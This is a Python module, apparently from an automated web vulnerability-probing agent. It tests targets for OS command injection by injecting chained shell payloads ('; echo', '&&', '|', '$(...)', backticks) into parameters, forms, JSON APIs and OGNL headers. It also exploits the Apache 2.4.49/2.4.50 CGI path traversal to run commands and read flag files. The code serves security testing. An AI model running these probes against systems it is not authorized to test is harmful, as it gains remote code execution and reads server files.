from __future__ import annotations

from typing import TYPE_CHECKING

from ravage.probe_suite_parts.command.command_chains import _probe_command_chained_json_eval
from ravage.probe_suite_parts.command.command_forms import (
    _has_command_tagged_form,
    _probe_command_forms,
    _probe_command_url_validator_forms,
)
from ravage.probe_suite_parts.command.command_json_ognl import (
    _probe_command_json_api,
    _probe_command_ognl_headers,
)
from ravage.probe_suite_parts.command.command_payloads import _COMMAND_PROOF_BUDGET
from ravage.probe_suite_parts.command.command_query import (
    _probe_command_query_followups,
    _probe_command_query_proofs,
    _probe_command_query_timing,
)
from ravage.probe_suite_parts.command.command_signals import (
    _has_command_proof,
    command_payload_signal,
)
from ravage.probe_suite_parts.command.command_targets import (
    _command_context_parameter_targets,
    _command_target_filter,
    _command_target_sort_key,
    _state_has_command_boundary_context,
    _state_has_ognl_action_context,
)
from ravage.probe_suite_parts.general import _filtered_parameter_targets, safe_get
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probe_suite_parts.support import _marker
from ravage.probes.apache_traversal import (
    ApacheTraversalVector,
    apache_cgi_marker_body,
    apache_cgi_read_body,
    apache_cgi_vectors,
    apache_known_proof_paths,
)
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    compare_responses,
    inject_query_param,
)
from ravage.web_core.proof_recognizer import recognize_proofs

if TYPE_CHECKING:
    from ravage.agent_core.agent_state import AgentState

_APACHE_CGI_REQUEST_BUDGET = 16
_APACHE_CGI_FLAG_PATH_LIMIT = 10


def probe_command_boundary(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    marker = _marker("CMD")
    payloads = {
        f"127.0.0.1; echo {marker}": marker,
        f"127.0.0.1 && echo {marker}": marker,
        f"127.0.0.1|echo {marker}": marker,
        f"127.0.0.1\n echo {marker}": marker,
        f"127.0.0.1%0Aecho {marker}": marker,
        f"127.0.0.1$(echo {marker})": marker,
        f"2024-01-01; echo {marker}": marker,
        f"2024-01-01 && echo {marker}": marker,
        f"2024-01-01|echo {marker}": marker,
        f"2024-01-01\n echo {marker}": marker,
        f"2024-01-01%0Aecho {marker}": marker,
        f"2024-01-01$(echo {marker})": marker,
        f"http://127.0.0.1; echo {marker}": marker,
        f"http://127.0.0.1 && echo {marker}": marker,
        f"http://127.0.0.1|echo {marker}": marker,
        f"http://127.0.0.1%0Aecho {marker}": marker,
        f"http://127.0.0.1$(echo {marker})": marker,
        f"`echo {marker}`": marker,
        f"-t custom echo {marker}": marker,
        f"--host=127.0.0.1; echo {marker}": marker,
    }
    return _command_boundary_probe(
        session,
        state,
        marker=marker,
        payloads=payloads,
    )


def _command_boundary_probe(  # noqa: C901, PLR0912, PLR0915
    session: ProbeSession,
    state: AgentState,
    *,
    marker: str,
    payloads: dict[str, str],
) -> ProbeRunResult:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    proof_budget = _COMMAND_PROOF_BUDGET
    apache_findings, apache_requests = _probe_apache_cgi_traversal_rce(
        session,
        state,
        marker,
    )
    targets = _filtered_parameter_targets(state, _command_target_filter, limit=64)
    targets.extend(_command_context_parameter_targets(state, targets))
    targets.sort(key=_command_target_sort_key)
    forms_first = _state_has_command_boundary_context(state) or _has_command_tagged_form(state)
    ognl_action_context = _state_has_ognl_action_context(state)
    forms_tested = False
    ognl_tested = False
    if ognl_action_context and proof_budget > 0:
        ognl_findings, ognl_requests, proof_budget = _probe_command_ognl_headers(
            session,
            state,
            marker,
            proof_budget,
        )
        ognl_tested = True
        findings.extend(ognl_findings)
        requests.extend(ognl_requests)
    if not _has_command_proof(findings) and proof_budget > 0:
        validator_findings, validator_requests, proof_budget = _probe_command_url_validator_forms(
            session,
            state,
            marker,
            proof_budget,
        )
        findings.extend(validator_findings)
        requests.extend(validator_requests)
    if forms_first and proof_budget > 0:
        form_findings, form_requests, proof_budget = _probe_command_forms(
            session,
            state,
            marker,
            payloads,
            proof_budget,
            fast=ognl_action_context,
        )
        forms_tested = True
        findings.extend(form_findings)
        requests.extend(form_requests)
    chain_tested = False
    if not _has_command_proof(findings) and proof_budget > 0:
        chain_findings, chain_requests, proof_budget = _probe_command_chained_json_eval(
            session,
            state,
            targets,
            marker,
            proof_budget,
        )
        chain_tested = True
        findings.extend(chain_findings)
        requests.extend(chain_requests)
    for target in targets[:10]:
        if _has_command_proof(findings) or proof_budget <= 0:
            break
        baseline = safe_get(session, str(target["url"]))
        requests.append(baseline.summary(body_chars=100))
        for payload, expected in payloads.items():
            probe_url = inject_query_param(str(target["url"]), str(target["name"]), payload)
            response = safe_get(session, probe_url)
            requests.append(response.summary(body_chars=160))
            delta = compare_responses(baseline, response, marker=payload)
            followup_findings, followup_requests = _probe_command_query_followups(
                session,
                target,
                marker=expected,
                payload=payload,
                probe_url=probe_url,
            )
            requests.extend(followup_requests)
            if (
                not command_payload_signal(response, expected, payload, delta)
                and not followup_findings
            ):
                continue
            findings.append(
                {
                    "type": "command_boundary_signal",
                    "input": target,
                    "payload": payload,
                    "expected": expected,
                    "url": probe_url.replace(payload, "PAYLOAD"),
                    "delta": delta.to_json(),
                    "response": response.summary(body_chars=220),
                }
            )
            findings.extend(followup_findings)
            proof_findings, proof_requests, proof_budget = _probe_command_query_proofs(
                session,
                target,
                payload,
                marker,
                proof_budget,
            )
            findings.extend(proof_findings)
            requests.extend(proof_requests)
            break
        if not _has_command_proof(findings) and proof_budget > 0:
            timing_findings, timing_requests, proof_budget = _probe_command_query_timing(
                session,
                target,
                marker,
                payloads,
                proof_budget,
            )
            findings.extend(timing_findings)
            requests.extend(timing_requests)
        if _has_command_proof(findings) or proof_budget <= 0:
            break
    if not chain_tested and not _has_command_proof(findings) and proof_budget > 0:
        chain_findings, chain_requests, proof_budget = _probe_command_chained_json_eval(
            session,
            state,
            targets,
            marker,
            proof_budget,
        )
        findings.extend(chain_findings)
        requests.extend(chain_requests)
    if not forms_tested and not _has_command_proof(findings) and proof_budget > 0:
        form_findings, form_requests, proof_budget = _probe_command_forms(
            session,
            state,
            marker,
            payloads,
            proof_budget,
        )
        findings.extend(form_findings)
        requests.extend(form_requests)
    if not _has_command_proof(findings) and proof_budget > 0:
        json_findings, json_requests, proof_budget = _probe_command_json_api(
            session,
            state,
            marker,
            payloads,
            proof_budget,
        )
        findings.extend(json_findings)
        requests.extend(json_requests)
    if not ognl_tested and not _has_command_proof(findings) and proof_budget > 0:
        ognl_findings, ognl_requests, proof_budget = _probe_command_ognl_headers(
            session,
            state,
            marker,
            proof_budget,
        )
        findings.extend(ognl_findings)
        requests.extend(ognl_requests)
    all_findings = [*apache_findings, *findings]
    all_requests = [*apache_requests, *requests]
    return ProbeRunResult(
        ok=bool(all_findings),
        probe="command_boundary",
        summary=(
            f"tested {len(targets)} parameter target(s) and forms; "
            f"findings={len(all_findings)}, "
            f"proof_requests={_COMMAND_PROOF_BUDGET - proof_budget}, "
            f"apache_requests={len(apache_requests)}"
        ),
        findings=all_findings[:30],
        requests=all_requests[:60],
    )


def _probe_apache_cgi_traversal_rce(
    session: ProbeSession,
    state: AgentState,
    marker: str,
) -> tuple[list[dict[str, object]], list[dict[str, object]]]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    apache_budget = _APACHE_CGI_REQUEST_BUDGET

    baseline = safe_get(session, session.target_url)
    apache_budget -= 1
    requests.append(
        baseline.summary(body_chars=100) | {"probe_kind": "apache_cgi_traversal_baseline"}
    )
    server = str(baseline.headers.get("server") or "").lower()
    if "apache/2.4.49" not in server and "apache/2.4.50" not in server:
        return findings, requests

    for vector in apache_cgi_vectors(server):
        if apache_budget <= 0:
            break
        url = session.absolute(vector.path_for())
        marker_body = apache_cgi_marker_body(marker)
        response = session.request(
            "POST",
            url,
            data=marker_body.encode("utf-8"),
            headers={"Content-Type": "text/plain"},
        )
        apache_budget -= 1
        requests.append(
            response.summary(body_chars=220)
            | {
                "probe_kind": "apache_cgi_traversal_signal",
                "url": response.url,
                "family": vector.family,
                "depth": vector.depth,
                "candidate_strategy": "breadth_before_depth",
            }
        )
        if marker not in response.body:
            continue
        findings.extend(
            (
                _apache_cgi_signal(response, vector, marker),
                _apache_cgi_execution_proof(response, vector, marker, command=marker_body),
            )
        )
        if state.surface.get("flag_objective") is True and apache_budget > 0:
            proof_finding, closure_requests, apache_budget = _probe_apache_cgi_closure(
                session,
                vector,
                apache_budget,
            )
            requests.extend(closure_requests)
            if proof_finding is not None:
                findings.append(proof_finding)
        return findings, requests
    return findings, requests


def _probe_apache_cgi_closure(
    session: ProbeSession,
    vector: ApacheTraversalVector,
    proof_budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    url = session.absolute(vector.path_for())
    for path in apache_known_proof_paths()[:_APACHE_CGI_FLAG_PATH_LIMIT]:
        if proof_budget <= 0:
            break
        command = apache_cgi_read_body(path)
        response = session.request(
            "POST",
            url,
            data=command.encode("utf-8"),
            headers={"Content-Type": "text/plain"},
        )
        proof_budget -= 1
        requests.append(
            response.summary(body_chars=520)
            | {
                "probe_kind": "apache_cgi_traversal_proof",
                "url": response.url,
                "path": path,
                "family": vector.family,
                "depth": vector.depth,
                "candidate_strategy": "explicit_flag_objective_bounded_closure",
            }
        )
        proofs = recognize_proofs(response.body)
        if proofs:
            finding = _apache_proof_finding(response, vector, proofs, command=command)
            return finding, requests, proof_budget
    return None, requests, proof_budget


def _apache_cgi_signal(
    response: ProbeResponse,
    vector: ApacheTraversalVector,
    marker: str,
) -> dict[str, object]:
    return {
        "type": "command_boundary_signal",
        "input": {
            "url": response.url,
            "vector": "apache_cgi_path_traversal",
            "family": vector.family,
            "depth": vector.depth,
        },
        "payload": "POST body: echo; printf MARKER",
        "expected": marker,
        "url": response.url,
        "response": response.summary(body_chars=300),
    }


def _apache_proof_finding(
    response: ProbeResponse,
    vector: ApacheTraversalVector,
    proofs: list[str],
    *,
    command: str,
) -> dict[str, object]:
    replay: dict[str, object]
    if vector.mode == "cgi":
        replay = {"method": "POST", "url": response.url, "body": command}
    else:
        replay = {"method": "GET", "url": response.url}
    return {
        "type": "command_boundary_proof",
        "input": {
            "url": response.url,
            "vector": (
                "apache_cgi_path_traversal"
                if vector.mode == "cgi"
                else "apache_path_traversal_file_read"
            ),
            "family": vector.family,
            "depth": vector.depth,
        },
        "payload": (
            "POST body: echo; COMMAND" if vector.mode == "cgi" else "GET traversal path"
        ),
        "proof": proofs[0],
        "proofs": proofs,
        "response": response.summary(body_chars=700),
        "replay": replay,
    }


def _apache_cgi_execution_proof(
    response: ProbeResponse,
    vector: ApacheTraversalVector,
    marker: str,
    *,
    command: str,
) -> dict[str, object]:
    return {
        "type": "command_boundary_proof",
        "proof_kind": "controlled_execution_marker",
        "execution_proof": marker,
        "expected": marker,
        "input": {
            "url": response.url,
            "vector": "apache_cgi_path_traversal",
            "family": vector.family,
            "depth": vector.depth,
        },
        "payload": "POST body: split marker reconstruction",
        "response": response.summary(body_chars=700),
        "replay": {"method": "POST", "url": response.url, "body": command},
    }
